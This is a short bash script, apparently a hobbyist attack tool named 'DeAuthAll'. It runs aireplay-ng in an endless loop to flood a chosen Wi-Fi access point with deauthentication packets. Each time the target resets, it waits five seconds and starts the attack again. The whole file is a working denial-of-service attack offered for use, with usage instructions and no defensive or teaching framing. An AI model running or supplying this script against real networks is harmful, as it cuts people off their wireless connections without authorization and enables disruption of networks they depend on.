figlet 'DeAuthAll'
echo 'Author: Jethr0'
if [ -z "$1" ] # Checks for missing argument
then
    echo '[!] Missing arguments!'
    echo 'Usage:'
    echo './deauthall.sh <targets MAC> <wireless interface>'
    exit
fi
while true # The function of the while loop here is so that the attack can go forever, even if the target AP resets itself
do
    aireplay-ng -0 0 -a $1 $2 # This aireplay-ng command is set to attack a network with infinite deauth packets.
    echo '[!] Network was reset. Waiting 5 seconds and recommencing attack'
    sleep 5
done
